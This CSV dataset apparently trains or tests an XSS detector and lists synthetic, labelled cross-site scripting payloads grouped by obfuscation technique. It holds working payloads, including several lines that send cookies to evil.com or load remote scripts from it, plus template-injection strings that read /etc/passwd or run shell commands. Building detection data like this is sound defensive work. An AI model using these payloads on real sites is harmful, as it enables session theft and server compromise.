Sentence,Label,Category,Source
java\u0073\u0063ript:alert(1),1,unicode_hex_escape,synthetic_harshit_2025
<iframe src=java\u0073cript:alert(1)>,1,unicode_hex_escape,synthetic_harshit_2025
<script>eval(\u0022alert(1)\u0022)</script>,1,unicode_hex_escape,synthetic_harshit_2025
<input onfocus=\u0061lert(1) autofocus>,1,unicode_hex_escape,synthetic_harshit_2025
<script>[\u0061\u006c\u0065\u0072\u0074][0](1)</script>,1,unicode_hex_escape,synthetic_harshit_2025
<script>\u0077indow[\u0022\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u0022]=\u0022https://evil.com\u0022</script>,1,unicode_hex_escape,synthetic_harshit_2025
"<script>eval(atob(""YWxlcnQoMSk=""))</script>",1,base64_encoded,synthetic_harshit_2025
"<script>eval(atob(""YWxlcnQoZG9jdW1lbnQuY29va2llKQ==""))</script>",1,base64_encoded,synthetic_harshit_2025
"<script>eval(atob(""ZG9jdW1lbnQud3JpdGUoZG9jdW1lbnQuY29va2llKQ==""))</script>",1,base64_encoded,synthetic_harshit_2025
"<iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",1,base64_encoded,synthetic_harshit_2025
"<script>eval(atob(""ZmV0Y2goJ2h0dHBzOi8vZXZpbC5jb20vP2M9Jytkb2N1bWVudC5jb29raWUp""))</script>",1,base64_encoded,synthetic_harshit_2025
"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",1,base64_encoded,synthetic_harshit_2025
"data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+",1,base64_encoded,synthetic_harshit_2025
"<script>Function(atob(""YWxlcnQoMSk=""))()</script>",1,base64_encoded,synthetic_harshit_2025
"<script>setTimeout(atob(""YWxlcnQoMSk=""),0)</script>",1,base64_encoded,synthetic_harshit_2025
"<script src=""data:text/javascript;base64,YWxlcnQoMSk=""></script>",1,base64_encoded,synthetic_harshit_2025
"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",1,base64_encoded,synthetic_harshit_2025
"<embed src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",1,base64_encoded,synthetic_harshit_2025
"<script>new Function(atob(""YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==""))()</script>",1,base64_encoded,synthetic_harshit_2025
"<script>window[atob(""ZXZhbA=="")](atob(""YWxlcnQoMSk=""))</script>",1,base64_encoded,synthetic_harshit_2025
"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",1,fromcharcode,synthetic_harshit_2025
"<script>eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))</script>",1,fromcharcode,synthetic_harshit_2025
"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",1,fromcharcode,synthetic_harshit_2025
"<script>document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))</script>",1,fromcharcode,synthetic_harshit_2025
"<script>setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),0)</script>",1,fromcharcode,synthetic_harshit_2025
"<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",1,fromcharcode,synthetic_harshit_2025
"<script>[].constructor.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))()</script>",1,fromcharcode,synthetic_harshit_2025
"<script>new Function(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()</script>",1,fromcharcode,synthetic_harshit_2025
"<script>window[String.fromCharCode(101,118,97,108)](String.fromCharCode(97,108,101,114,116,40,49,41))</script>",1,fromcharcode,synthetic_harshit_2025
"<script>Array.from({length:1},()=>eval(String.fromCharCode(97,108,101,114,116,40,49,41)))</script>",1,fromcharcode,synthetic_harshit_2025
"<script>String.fromCharCode(60,47,115,99,114,105,112,116,62)</script>",1,fromcharcode,synthetic_harshit_2025
"<script>[String.fromCharCode(97,108,101,114,116)](1)</script>",1,fromcharcode,synthetic_harshit_2025
<ScRiPt>alert(1)</ScRiPt>,1,mixed_case_obfuscation,synthetic_harshit_2025
<SCRIPT>alert(1)</SCRIPT>,1,mixed_case_obfuscation,synthetic_harshit_2025
<Script>alert(document.cookie)</Script>,1,mixed_case_obfuscation,synthetic_harshit_2025
<sCrIpT>alert(1)</sCrIpT>,1,mixed_case_obfuscation,synthetic_harshit_2025
<img SRC=x OnErRoR=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
<IMG SRC=X ONERROR=ALERT(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
<Img Src=x OnError=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
<SVG ONLOAD=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
<Svg OnLoad=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
<sVg oNlOaD=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
JaVaScRiPt:alert(1),1,mixed_case_obfuscation,synthetic_harshit_2025
JAVASCRIPT:alert(1),1,mixed_case_obfuscation,synthetic_harshit_2025
Javascript:alert(document.cookie),1,mixed_case_obfuscation,synthetic_harshit_2025
<A HREF=JAVASCRIPT:ALERT(1)>click</A>,1,mixed_case_obfuscation,synthetic_harshit_2025
<a HrEf=JaVaScRiPt:alert(1)>click</a>,1,mixed_case_obfuscation,synthetic_harshit_2025
<BODY ONLOAD=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
<Body OnLoad=alert(document.cookie)>,1,mixed_case_obfuscation,synthetic_harshit_2025
<INPUT AUTOFOCUS ONFOCUS=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
<Input AutoFocus OnFocus=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
<IFRAME SRC=JAVASCRIPT:ALERT(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
<IFrame Src=JavaScript:alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
<DETAILS OPEN ONTOGGLE=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
<Details Open OnToggle=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
<VIDEO SRC=X ONERROR=ALERT(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
<Video Src=x OnError=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
<oBjEcT dAtA=jAvAsCrIpT:AlErT(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
<EmBeD sRc=JaVaScRiPt:AlErT(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
"<script>var a=""al""+""er""+""t"";window[a](1)</script>",1,string_concat_obfuscation,synthetic_harshit_2025
"<script>window[""ale""+""rt""](1)</script>",1,string_concat_obfuscation,synthetic_harshit_2025
"<script>this[""al""+""er""+""t""](1)</script>",1,string_concat_obfuscation,synthetic_harshit_2025
"<script>window[""a""+""l""+""e""+""r""+""t""](document[""coo""+""kie""])</script>",1,string_concat_obfuscation,synthetic_harshit_2025
"<script>var f=""ev""+""al"";window[f](""alert(1)"")</script>",1,string_concat_obfuscation,synthetic_harshit_2025
"<script>(0)[""constructor""][""constructor""](""alert(1)"")()</script>",1,string_concat_obfuscation,synthetic_harshit_2025
"<script>[][][""flat""][""constructor""](""alert(1)"")()</script>",1,string_concat_obfuscation,synthetic_harshit_2025
"<script>[].filter.constructor(""alert(1)"")()</script>",1,string_concat_obfuscation,synthetic_harshit_2025
"<script>[].map.constructor(""alert(1)"")()</script>",1,string_concat_obfuscation,synthetic_harshit_2025
"<script>Math.abs.constructor(""alert(1)"")()</script>",1,string_concat_obfuscation,synthetic_harshit_2025
"<script>isNaN.constructor(""alert(1)"")()</script>",1,string_concat_obfuscation,synthetic_harshit_2025
"<script>var s=""doc""+""ument"";var c=""coo""+""kie"";alert(window[s][c])</script>",1,string_concat_obfuscation,synthetic_harshit_2025
"<img src=x onerror=""window['al'+'er'+'t'](1)"">",1,string_concat_obfuscation,synthetic_harshit_2025
"<script>setTimeout[""constructor""](""alert(1)"")()</script>",1,string_concat_obfuscation,synthetic_harshit_2025
"<script>setInterval[""constructor""](""alert(1)"")()</script>",1,string_concat_obfuscation,synthetic_harshit_2025
?__proto__[innerHTML]=<img/src/onerror=alert(1)>,1,prototype_pollution,synthetic_harshit_2025
?__proto__[src]=x&__proto__[onerror]=alert(1),1,prototype_pollution,synthetic_harshit_2025
?constructor[prototype][innerHTML]=<script>alert(1)</script>,1,prototype_pollution,synthetic_harshit_2025
__proto__[dangerouslySetInnerHTML][__html]=<img src=x onerror=alert(1)>,1,prototype_pollution,synthetic_harshit_2025
?__proto__[script]=1&__proto__[src]=//,1,prototype_pollution,synthetic_harshit_2025
?__proto__[template]=<img src=x onerror=alert(1)>,1,prototype_pollution,synthetic_harshit_2025
?__proto__[href]=javascript:alert(1),1,prototype_pollution,synthetic_harshit_2025
?constructor.prototype.innerHTML=<script>alert(1)</script>,1,prototype_pollution,synthetic_harshit_2025
"json={""__proto__"":{""innerHTML"":""<img src=x onerror=alert(1)>""}}",1,prototype_pollution,synthetic_harshit_2025
"{""__proto__"":{""dangerouslySetInnerHTML"":{""__html"":""<img src=x onerror=alert(1)>""}}}",1,prototype_pollution,synthetic_harshit_2025
?__proto__[srcdoc]=<script>alert(1)</script>,1,prototype_pollution,synthetic_harshit_2025
?__proto__[onload]=alert(1),1,prototype_pollution,synthetic_harshit_2025
?constructor[prototype][onload]=alert(1),1,prototype_pollution,synthetic_harshit_2025
?__proto__[onerror]=alert(1)&__proto__[src]=x,1,prototype_pollution,synthetic_harshit_2025
"<script>Object.prototype.innerHTML=""<img src=x onerror=alert(1)>""</script>",1,prototype_pollution,synthetic_harshit_2025
"<script>Object.prototype.src=""x"";Object.prototype.onerror=""alert(1)""</script>",1,prototype_pollution,synthetic_harshit_2025
"<script>var obj={};obj.__proto__.test=alert.bind(null,1);test()</script>",1,prototype_pollution,synthetic_harshit_2025
<script>Object.prototype.onload=()=>alert(1)</script>,1,prototype_pollution,synthetic_harshit_2025
"data={""__proto__"":{""eventsource"":""1"",""url"":""//evil.com/xss.js""}}",1,prototype_pollution,synthetic_harshit_2025
?__proto__[action]=javascript:alert(1),1,prototype_pollution,synthetic_harshit_2025
"<script>window.postMessage(""<img src=x onerror=alert(1)>"",""*"")</script>",1,postmessage_xss,synthetic_harshit_2025
"<script>window.addEventListener(""message"",e=>eval(e.data));postMessage(""alert(1)"",""*"")</script>",1,postmessage_xss,synthetic_harshit_2025
"<script>window.addEventListener(""message"",function(e){document.getElementById(""x"").innerHTML=e.data},false)</script>",1,postmessage_xss,synthetic_harshit_2025
"<script>window.onmessage=e=>eval(e.data);postMessage(""alert(document.cookie)"",""*"")</script>",1,postmessage_xss,synthetic_harshit_2025
"<script>window.onmessage=function(e){document.write(e.data)};postMessage(""<script>alert(1)<\/script>"",""*"")</script>",1,postmessage_xss,synthetic_harshit_2025
"<script>window.addEventListener(""message"",e=>document.body.innerHTML=e.data,false);top.postMessage(""<img src=x onerror=alert(1)>"",""*"")</script>",1,postmessage_xss,synthetic_harshit_2025
"<iframe src=""victim.html"" onload=""this.contentWindow.postMessage('<img src=x onerror=alert(1)>','*')"">",1,postmessage_xss,synthetic_harshit_2025
"<script>parent.postMessage({""type"":""xss"",""data"":""<script>alert(1)<\/script>""},""*"")</script>",1,postmessage_xss,synthetic_harshit_2025
"<script>window.addEventListener(""message"",e=>{if(e.data.type===""navigate"")location=e.data.url})</script>",1,postmessage_xss,synthetic_harshit_2025
"<script>frames[0].postMessage(""{""type"":""html"",""data"":""<img src=x onerror=alert(1)>""}"",""*"")</script>",1,postmessage_xss,synthetic_harshit_2025
<script>document.write(location.hash.slice(1))</script>,1,dom_xss,synthetic_harshit_2025
"<script>document.getElementById(""x"").innerHTML=location.search.slice(1)</script>",1,dom_xss,synthetic_harshit_2025
<script>document.body.innerHTML=decodeURIComponent(location.hash.slice(1))</script>,1,dom_xss,synthetic_harshit_2025
"<script>var x=document.URL;document.write(x.substring(x.indexOf(""q="")+2))</script>",1,dom_xss,synthetic_harshit_2025
"<script>document.getElementById(""out"").innerHTML=window.name</script>",1,dom_xss,synthetic_harshit_2025
<script>eval(location.hash.slice(1))</script>,1,dom_xss,synthetic_harshit_2025
javascript:document.write(document.cookie),1,dom_xss,synthetic_harshit_2025
"<script>document.cookie=""xss=""+document.location;document.location=""https://evil.com/""+document.cookie</script>",1,dom_xss,synthetic_harshit_2025
"<script>var data=location.href.split(""#"")[1];document.write(data)</script>",1,dom_xss,synthetic_harshit_2025
"<script>element.setAttribute(""href"",location.search.slice(1))</script>",1,dom_xss,synthetic_harshit_2025
"<script>var u=new URLSearchParams(location.search);document.write(u.get(""q""))</script>",1,dom_xss,synthetic_harshit_2025
"<script>document.execCommand(""insertHTML"",false,location.hash.slice(1))</script>",1,dom_xss,synthetic_harshit_2025
"<script>document.body.insertAdjacentHTML(""beforeend"",location.hash.slice(1))</script>",1,dom_xss,synthetic_harshit_2025
"<script>var s=document.createElement(""script"");s.src=location.hash.slice(1);document.head.appendChild(s)</script>",1,dom_xss,synthetic_harshit_2025
<script>jQuery.globalEval(location.hash.slice(1))</script>,1,dom_xss,synthetic_harshit_2025
"<script>$(""#result"").html(location.hash.slice(1))</script>",1,dom_xss,synthetic_harshit_2025
"<script>document.querySelector(""#msg"").innerHTML=location.hash.slice(1)</script>",1,dom_xss,synthetic_harshit_2025
"<script>history.pushState(null,null,location.hash);document.write(location.hash.slice(1))</script>",1,dom_xss,synthetic_harshit_2025
"{{constructor.constructor(""alert(1)"")()}}",1,template_injection,synthetic_harshit_2025
"{{7*7}}{{constructor.constructor(""alert(1)"")()}}",1,template_injection,synthetic_harshit_2025
${alert(1)},1,template_injection,synthetic_harshit_2025
${{alert(1)}},1,template_injection,synthetic_harshit_2025
#{alert(1)},1,template_injection,synthetic_harshit_2025
<%= alert(1) %>,1,template_injection,synthetic_harshit_2025
"{{$on.constructor(""alert(1)"")()}}",1,template_injection,synthetic_harshit_2025
"{{this.constructor.constructor(""alert(1)"")()}}",1,template_injection,synthetic_harshit_2025
"{{a=constructor.constructor(""alert(1)"")()}}",1,template_injection,synthetic_harshit_2025
"{{[].pop.constructor(""alert(1)"")()}}",1,template_injection,synthetic_harshit_2025
"{{constructor.constructor(""fetch(//evil.com?c=""+document.cookie)()"")()}}",1,template_injection,synthetic_harshit_2025
"ng-app ng-csp><script>angular.element(document).injector().get(""$compile"")(""{{constructor.constructor('alert(1)')()}}"")($rootScope)</script>",1,template_injection,synthetic_harshit_2025
"v-html=""'<img src=x onerror=alert(1)>'""",1,template_injection,synthetic_harshit_2025
":href=""'javascript:alert(1)'""",1,template_injection,synthetic_harshit_2025
"@click=""eval('alert(1)')""",1,template_injection,synthetic_harshit_2025
"dangerouslySetInnerHTML={{__html: ""<img src=x onerror=alert(1)>""}}",1,template_injection,synthetic_harshit_2025
"${7*7}${"""".constructor.constructor(""alert(1)"")()}",1,template_injection,synthetic_harshit_2025
"{{request.__class__.__mro__[2].__subclasses__()[40](""/etc/passwd"").read()}}",1,template_injection,synthetic_harshit_2025
#{7*7},1,template_injection,synthetic_harshit_2025
*{alert(1)},1,template_injection,synthetic_harshit_2025
"<script>{{constructor.constructor(""alert(1)"") ()}}</script>",1,template_injection,synthetic_harshit_2025
"{{config.__class__.__init__.__globals__[""os""].popen(""id"").read()}}",1,template_injection,synthetic_harshit_2025
"[constructor.constructor(""alert(1)"")()]",1,template_injection,synthetic_harshit_2025
"{[constructor.constructor(""alert(1)"")()]}",1,template_injection,synthetic_harshit_2025
"<script nonce=""INJECT_NONCE"">alert(1)</script>",1,csp_bypass,synthetic_harshit_2025
<link rel=preload as=script href=//evil.com/xss.js>,1,csp_bypass,synthetic_harshit_2025
"<meta http-equiv=""refresh"" content=""0;url=javascript:alert(1)"">",1,csp_bypass,synthetic_harshit_2025
"<script src=""/api/jsonp?callback=alert""></script>",1,csp_bypass,synthetic_harshit_2025
"<script src=""/api/endpoint?format=js&data=alert(1)""></script>",1,csp_bypass,synthetic_harshit_2025
"<base href=""//evil.com/""><script src=""/trusted-path.js""></script>",1,csp_bypass,synthetic_harshit_2025
"<link rel=prefetch href=""//evil.com/steal?c="">",1,csp_bypass,synthetic_harshit_2025
"<script src=data:,alert(1)></script>",1,csp_bypass,synthetic_harshit_2025
"<iframe csp=""script-src 'none'"" srcdoc=""<script>alert(1)</script>"">",1,csp_bypass,synthetic_harshit_2025
"<script>location=""javascript:alert(1)""</script>",1,csp_bypass,synthetic_harshit_2025
"<script>import(""//evil.com/""+document.cookie)</script>",1,csp_bypass,synthetic_harshit_2025
"<object data=""//trusted.com/"" type=""text/html""><param name=src value=javascript:alert(1)>",1,csp_bypass,synthetic_harshit_2025
"<script src=""//trusted.com/jsonp?cb=alert""></script>",1,csp_bypass,synthetic_harshit_2025
"<svg><use href=""data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><script>alert(1)</script></svg>#x"">",1,csp_bypass,synthetic_harshit_2025
"<script>document.write(""<scr""+""ipt src=//evil.com/xss.js></scr""+""ipt>"")</script>",1,csp_bypass,synthetic_harshit_2025
"<script>var e=document.createElement(""script"");e.src=""//evil.com/x.js"";document.body.appendChild(e)</script>",1,csp_bypass,synthetic_harshit_2025
"<script integrity=""sha256-FAKESHA"">alert(1)</script>",1,csp_bypass,synthetic_harshit_2025
"<link rel=stylesheet href=""data:text/css,*{background-image:url(javascript:alert(1))}"">",1,csp_bypass,synthetic_harshit_2025
"<script>navigator.serviceWorker.register(""/evil-sw.js"")</script>",1,service_worker_xss,synthetic_harshit_2025
"<script>navigator.serviceWorker.register(""/sw.js"",{scope:""/""}).then(r=>r.active.postMessage({type:""xss""}))</script>",1,service_worker_xss,synthetic_harshit_2025
"<script>navigator.serviceWorker.ready.then(r=>r.showNotification(""XSS"",{body:document.cookie}))</script>",1,service_worker_xss,synthetic_harshit_2025
"<script>if(""serviceWorker"" in navigator){navigator.serviceWorker.register(""/xss-sw.js"")}</script>",1,service_worker_xss,synthetic_harshit_2025
<script>navigator.serviceWorker.getRegistrations().then(regs=>regs.forEach(r=>r.active.postMessage(document.cookie)))</script>,1,service_worker_xss,synthetic_harshit_2025
"<script>caches.open(""xss"").then(c=>c.add(""/steal?c=""+document.cookie))</script>",1,service_worker_xss,synthetic_harshit_2025
"<script>navigator.serviceWorker.addEventListener(""message"",e=>eval(e.data.script))</script>",1,service_worker_xss,synthetic_harshit_2025
"<script>navigator.serviceWorker.register(""/"").then(r=>{var w=r.installing||r.waiting||r.active;w.postMessage({url:location.href,cookie:document.cookie})})</script>",1,service_worker_xss,synthetic_harshit_2025
"<div id=host></div><script>var shadow=document.getElementById(""host"").attachShadow({mode:""open""});shadow.innerHTML=""<img src=x onerror=alert(1)>""</script>",1,shadow_dom_xss,synthetic_harshit_2025
"<script>customElements.define(""x-xss"",class extends HTMLElement{connectedCallback(){this.attachShadow({mode:""open""}).innerHTML=""<img src=x onerror=alert(1)>""}});document.body.appendChild(document.createElement(""x-xss""))</script>",1,shadow_dom_xss,synthetic_harshit_2025
"<template shadowrootmode=""open""><img src=x onerror=alert(1)></template>",1,shadow_dom_xss,synthetic_harshit_2025
"<template shadowroot=""open""><script>alert(1)<\/script></template>",1,shadow_dom_xss,synthetic_harshit_2025
"<div><template shadowrootmode=""open""><style>:host{color:red}</style><script>alert(1)<\/script></template></div>",1,shadow_dom_xss,synthetic_harshit_2025
"<script>var h=document.createElement(""div"");document.body.appendChild(h);var s=h.attachShadow({mode:""open""});s.innerHTML=""<iframe srcdoc=<script>alert(1)<\/script>>""</script>",1,shadow_dom_xss,synthetic_harshit_2025
"<div id=x></div><script>x.attachShadow({mode:""open""}).host.outerHTML=""<img src=x onerror=alert(1)>""</script>",1,shadow_dom_xss,synthetic_harshit_2025
"<custom-element><template shadowrootmode=""open""><script>parent.alert(1)<\/script></template></custom-element>",1,shadow_dom_xss,synthetic_harshit_2025
"<script>class XSSEl extends HTMLElement{constructor(){super();this.attachShadow({mode:""open""}).innerHTML=""<img src=x onerror=alert(1)>""}}customElements.define(""x-xss"",XSSEl)</script>",1,shadow_dom_xss,synthetic_harshit_2025
"<script>if(window.trustedTypes){var p=trustedTypes.createPolicy(""default"",{createHTML:s=>s});document.body.innerHTML=p.createHTML(""<img src=x onerror=alert(1)>"")}</script>",1,trusted_types_bypass,synthetic_harshit_2025
"<script>trustedTypes.createPolicy(""default"",{createScriptURL:url=>url,createScript:s=>s,createHTML:h=>h})</script>",1,trusted_types_bypass,synthetic_harshit_2025
"<script>const p=trustedTypes.createPolicy(""bypass"",{createHTML:()=>""<script>alert(1)<\/script>""});el.innerHTML=p.createHTML("""")</script>",1,trusted_types_bypass,synthetic_harshit_2025
"<script>window.__TRUSTED_TYPES__=trustedTypes.createPolicy(""policy"",{createHTML:v=>v})</script>",1,trusted_types_bypass,synthetic_harshit_2025
